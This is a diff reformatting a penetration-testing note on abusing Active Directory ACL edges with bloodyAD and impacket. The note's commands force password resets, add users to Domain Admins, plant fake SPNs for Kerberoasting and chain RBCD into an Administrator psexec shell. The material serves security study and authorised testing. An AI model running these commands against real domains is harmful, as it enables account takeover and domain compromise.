@@ -1,31 +1,25 @@
----
-title: "ACL Abuse with bloodyAD"
-stage: "5 - Lateral Movement"
-tags: [bloodyad, acl, dacl, lateral, ad]
----
-
-# ACL Abuse with bloodyAD
+## ACL Abuse with bloodyAD
 
 BloodHound surfaces the *attack edges* — `GenericAll`, `WriteOwner`, `WriteDACL`, `ForceChangePassword`, `AddSelf`, `WriteSPN`. `bloodyAD` is the Linux tool to actually exploit those edges.
 
 ---
 
-## Install
+### Install
 
 ```bash
 pipx install bloodyAD
-# or
+## or
 git clone https://github.com/CravateRouge/bloodyAD && cd bloodyAD
 pip install -r requirements.txt --break-system-packages
 ```
 
-## Read an Object
+### Read an Object
 
 ```bash
 bloodyAD -u <user> -p '<pass>' -d <dom>.local --host <dc-ip> get object <target>
 ```
 
-## Set an Attribute
+### Set an Attribute
 
 ```bash
 bloodyAD -u <user> -p '<pass>' -d <dom>.local --host <dc-ip> \
@@ -35,30 +29,30 @@ bloodyAD -u <user> -p '<pass>' -d <dom>.local --host <dc-ip> \
 Examples worth knowing:
 
 ```bash
-# Add a UPN suffix
+## Add a UPN suffix
 bloodyAD ... set object -v 'admin@<dom>.local' jdoe userPrincipalName
 
-# Set a fake SPN so the account becomes Kerberoastable
+## Set a fake SPN so the account becomes Kerberoastable
 bloodyAD ... set object -v 'fake/spn' victim servicePrincipalName
 
-# Disable account lockout / pwdLastSet manipulation
+## Disable account lockout / pwdLastSet manipulation
 bloodyAD ... set object -v '0' victim pwdLastSet
 ```
 
-## Add Group Membership (when you have rights on a group)
+### Add Group Membership (when you have rights on a group)
 
 ```bash
 bloodyAD -u <user> -p '<pass>' -d <dom>.local --host <dc-ip> \
     add groupMember 'Domain Admins' <user-to-add>
 ```
 
-## Show Writeable Objects (which ACL edges grant you something)
+### Show Writeable Objects (which ACL edges grant you something)
 
 ```bash
 bloodyAD -u <user> -p '<pass>' -d <dom>.local --host <dc-ip> get writable
 ```
 
-## Common Abuses by Edge
+### Common Abuses by Edge
 
 | BloodHound edge | What `bloodyAD` lets you do |
 |-----------------|------------------------------|
@@ -70,16 +64,16 @@ bloodyAD -u <user> -p '<pass>' -d <dom>.local --host <dc-ip> get writable
 | **AddMember** | Add yourself to a group (`Domain Admins`, `Account Operators`, etc.). |
 | **AddSelf** | Add yourself to a specific group (same effect as AddMember on yourself). |
 
-### Examples
+#### Examples
 
-#### ForceChangePassword
+##### ForceChangePassword
 
 ```bash
 bloodyAD -u <user> -p '<pass>' -d <dom>.local --host <dc-ip> \
     set password '<victim>' 'NewP@ss123!'
 ```
 
-#### Setting a Fake SPN (Targeted Kerberoasting)
+##### Setting a Fake SPN (Targeted Kerberoasting)
 
 ```bash
 bloodyAD ... set object -v 'http/x' <victim> servicePrincipalName
@@ -87,7 +81,7 @@ impacket-GetUserSPNs <dom>/<user>:<pass> -dc-ip <dc-ip> -request -outputfile spn
 hashcat -m 13100 spn.txt rockyou.txt
 ```
 
-#### Writing msDs-AllowedToActOnBehalfOfOtherIdentity (RBCD)
+##### Writing msDs-AllowedToActOnBehalfOfOtherIdentity (RBCD)
 
 ```bash
 impacket-addcomputer -computer-name 'PWN$' -computer-pass 'P@ss123' \
@@ -101,14 +95,7 @@ export KRB5CCNAME=Administrator.ccache
 impacket-psexec -k -no-pass <dom>/Administrator@<victim-fqdn>
 ```
 
-## Reference
+### Reference
 
 - Harmj0y's classic AD ACL cheatsheet: <https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993>
 - bloodyAD docs: <https://github.com/CravateRouge/bloodyAD/wiki>
-
----
-
-## See Also
-- [Active Directory Enumeration](../1-information-gathering/06-active-directory-enumeration.rmd) — BloodHound surfaces the edges.
-- [Kerberos Attacks](./03-kerberos-attacks.rmd) — for tickets created off ACL-driven RBCD.
-- [Credential Dumping](../4-post-exploitation/03-credential-dumping.rmd) — once the edge yields a hash, dump everything.
